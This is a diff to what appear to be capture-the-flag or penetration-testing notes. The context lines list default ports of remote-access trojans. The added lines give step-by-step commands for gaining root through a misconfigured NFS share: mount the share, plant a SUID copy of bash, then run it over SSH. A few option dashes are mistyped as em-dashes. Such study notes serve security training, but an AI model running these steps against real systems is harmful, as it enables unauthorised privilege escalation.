@@ -97,3 +97,24 @@ Theef default port: 9871, 6703, FTP 2968
 NJRAT default port: 5552 
 MoSucker default port: 200005 
 ProRat default port: 5110
+
+Exploiting misconfigured NFS (port 2049) 
+nmap -sV —p 2049 IP/Subnet 
+sudo apt-get install nfs-common 
+nmap -sV —script=nfs-showmount <Target_IP> 
+check available 
+mounts:showmount -e <Target_IP> -> we will see /home directory 
+mkdir /tmp/nfs 
+sudo mount -t nfs 10.10.1.9:/home /tmp/nfs 
+cd /tmp/nfs 
+sudo cp /bin/bash . 
+sudo chmod +s bash -> it will be highlighted in red 
+ls -la 
+sudo df -h 
+sudo chmod +s bash 
+after them, In another terminal: 
+Access to target using SSH 
+./bash -p and we're root! 
+cd /home 
+ls -la 
+Find the flag: find / -name "*.txt" -ls 2> /dev/null
